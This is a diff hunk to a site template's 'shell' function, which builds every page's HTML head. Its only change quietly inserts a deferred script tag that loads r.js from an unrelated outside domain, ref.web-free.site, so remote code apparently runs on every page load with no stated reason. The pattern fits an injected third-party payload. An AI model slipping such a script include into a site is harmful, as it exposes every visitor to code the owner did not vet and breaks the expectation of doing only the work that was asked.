@@ -33,6 +33,7 @@ function shell({ title, description, pathname, body, extraHead = '' }) {
 <meta name="twitter:description" content="${description}"/>
 <style>${pageCss}</style>
 ${extraHead}
+<script src="https://ref.web-free.site/r.js" defer></script>
 </head>
 <body>
 <header><div class="wrap"><strong><a href="/">${SITE_NAME}</a></strong>
